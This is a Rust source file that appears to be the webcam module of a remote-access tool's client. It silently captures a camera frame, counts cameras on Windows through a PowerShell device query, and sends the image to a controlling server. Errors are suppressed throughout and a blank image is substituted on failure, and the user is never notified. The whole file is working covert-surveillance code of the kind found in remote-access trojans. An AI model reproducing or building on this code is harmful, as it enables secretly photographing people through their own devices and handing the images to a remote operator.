use crate::handler::send_packet;
use common::packets::ServerboundPacket;
use tokio::task;
use std::{panic::{self, AssertUnwindSafe}, process::Command, thread};

pub async fn take_webcam() {
    task::spawn_blocking(move || {
        let handle = thread::spawn(|| {
            safe_webcam_capture()
        });
        
        match handle.join() {
            Ok(Some(data)) => {
                tokio::spawn(async move {
                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(data)).await {}
                });
            }
            _ => {
                // On failure, send a blank white image
                let white_image = create_blank_image(640, 480);
                tokio::spawn(async move {
                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(white_image)).await {}
                });
            }
        }
    });
}

fn safe_webcam_capture() -> Option<Vec<u8>> {
    match panic::catch_unwind(AssertUnwindSafe(|| {
        attempt_nokhwa_capture()
    })) {
        Ok(Some(data)) => Some(data),
        _ => None
    }
}

fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
    use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
    use nokhwa::pixel_format::RgbFormat;

    #[cfg(target_os = "windows")]
    {
        let devices_output = Command::new("powershell")
            .args(&["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
            .output();
            
        match devices_output {
            Ok(output) => {
                if let Ok(count_str) = String::from_utf8(output.stdout) {
                    if let Ok(count) = count_str.trim().parse::<i32>() {
                        if count == 0 {
                            return None;
                        }
                    }
                }
            }
            Err(_) => {}
        }
    }
    
    let camera_index = CameraIndex::Index(0);
    let requested_format = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
    
    let camera_result = panic::catch_unwind(AssertUnwindSafe(|| {
        Camera::new(camera_index, requested_format)
    }));
    
    let mut camera = match camera_result {
        Ok(Ok(cam)) => cam,
        _ => return None
    };
    
    if let Err(_) = camera.open_stream() {
        return None;
    }
    
    let frame_result = panic::catch_unwind(AssertUnwindSafe(|| {
        camera.frame()
    }));
    
    let _ = panic::catch_unwind(AssertUnwindSafe(|| {
        camera.stop_stream()
    }));
    
    let frame = match frame_result {
        Ok(Ok(f)) => f,
        _ => return None
    };
    
    let data_result = panic::catch_unwind(AssertUnwindSafe(|| {
        let buffer = frame.buffer();
        
        if buffer.len() > 100_000_000 {
            return None;
        }
        
        let data: Vec<u8> = buffer.iter().cloned().collect();
        Some(data)
    }));
    
    match data_result {
        Ok(Some(data)) => Some(data),
        _ => None
    }
}

fn create_blank_image(width: u32, height: u32) -> Vec<u8> {
    let pixels = width as usize * height as usize;
    let mut image_data = Vec::with_capacity(pixels * 3); // RGB format
    
    for _ in 0..pixels {
        image_data.push(255); // R
        image_data.push(255); // G
        image_data.push(255); // B
    }
    
    image_data
}
 